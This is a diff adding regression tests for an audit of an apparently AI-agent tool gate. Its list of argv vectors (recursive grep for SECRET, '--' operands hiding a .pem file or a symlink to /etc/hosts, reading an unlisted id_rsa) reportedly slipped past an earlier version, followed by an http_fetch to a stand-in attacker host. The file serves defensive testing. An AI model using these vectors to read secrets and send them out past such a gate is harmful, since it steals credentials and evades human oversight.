@@ -438,6 +438,87 @@ class TestBashArgvContract(GateTestBase):
                     fs.close()
 
 
+class TestAuditV063Regressions(GateTestBase):
+    """v0.6.3 audit regressions. Every vector below passed vetting (or, for
+    id_rsa, left the session untainted) against the v0.6.2 binary, and each
+    was demonstrated end to end: a secret read through bash_workspace or an
+    unlisted key name followed by an allowed http_fetch."""
+
+    def _fresh(self):
+        td = tempfile.mkdtemp(prefix="mcp-gate-audit-")
+        self.addCleanup(shutil.rmtree, td, ignore_errors=True)
+        fs = GateSession(td)
+        with open(os.path.join(fs.ws, "-creds.pem"), "w") as f:
+            f.write("PEMDATA\n")
+        os.symlink("/etc/hosts", os.path.join(fs.ws, "-link"))
+        with open(os.path.join(fs.ws, "id_rsa"), "w") as f:
+            f.write("RSADATA\n")
+        with open(os.path.join(fs.ws, "names0"), "w") as f:
+            f.write("secrets/.env\0")
+        return fs
+
+    def test_indirect_and_dash_operand_reads_denied(self):
+        vectors = [
+            ["grep", "-r", "SECRET", "."],                 # recursive grep
+            ["grep", "-R", "SECRET", "."],
+            ["grep", "-rn", "SECRET", "."],                # clustered short flag
+            ["grep", "-nR", "SECRET", "secrets"],
+            ["grep", "--recursive", "SECRET", "."],
+            ["grep", "--rec", "SECRET", "."],              # getopt abbreviation
+            ["grep", "-d", "recurse", "SECRET", "."],      # --directories=recurse
+            ["grep", "--directories", "recurse", "SECRET", "."],
+            ["diff", "-r", "secrets", "sub"],              # recursive diff
+            ["diff", ".", "sub"],                          # directory operand
+            ["diff", "readme.txt", "secrets"],
+            ["wc", "--files0-from", "names0"],             # reads names from file
+            ["sha256sum", "-c", "readme.txt"],             # reads names from file
+            ["cat", "--", "-creds.pem"],                   # '--' hides suffix
+            ["cat", "--", "-link"],                        # '--' hides symlink
+            ["cat", "id_rsa"],                             # unlisted key name
+            ["find", ".", "-fprint0", "written"],          # find writes a file
+        ]
+        for argv in vectors:
+            with self.subTest(argv=argv):
+                fs = self._fresh()
+                try:
+                    r = fs.call("tools/call", {"name": "bash_workspace",
+                                               "arguments": {"argv": argv}})
+                    self.assertEqual(err_code(r), E_POLICY, argv)
+                    self.assertEqual(fs.forwarded_calls(), [])
+                    self.assertFalse(os.path.exists(os.path.join(fs.ws, "written")))
+                finally:
+                    fs.close()
+
+    def test_ssh_key_read_taints_and_blocks_exfil(self):
+        fs = self._fresh()
+        try:
+            r = fs.call("tools/call", {"name": "read_file",
+                                       "arguments": {"path": fs.prefix + "id_rsa"}})
+            self.assertNotIn("error", r)
+            r = fs.call("tools/call", {"name": "http_fetch",
+                                       "arguments": {"url": "http://attacker.invalid"}})
+            self.assertEqual(err_code(r), E_POLICY)
+        finally:
+            fs.close()
+
+    def test_ordinary_reads_still_allowed(self):
+        s = self.session
+        for argv in (["grep", "-n", "hello", "readme.txt"],
+                     ["grep", "-i", "-c", "HELLO", "readme.txt"],
+                     ["diff", "readme.txt", "sub/deep.txt"],
+                     ["wc", "-l", "readme.txt"],
+                     ["sha256sum", "readme.txt"],
+                     ["find", ".", "-name", "*.txt"],
+                     ["cat", "--", "readme.txt"]):
+            with self.subTest(argv=argv):
+                r = s.call("tools/call", {"name": "bash_workspace",
+                                          "arguments": {"argv": argv}})
+                self.assertNotIn("error", r, argv)
+        r = s.call("tools/call", {"name": "http_fetch",
+                                  "arguments": {"url": "http://example.invalid"}})
+        self.assertNotIn("error", r)
+
+
 class TestExfilAndHalt(GateTestBase):
     def test_unregistered_tool_fails_closed(self):
         s = self.session
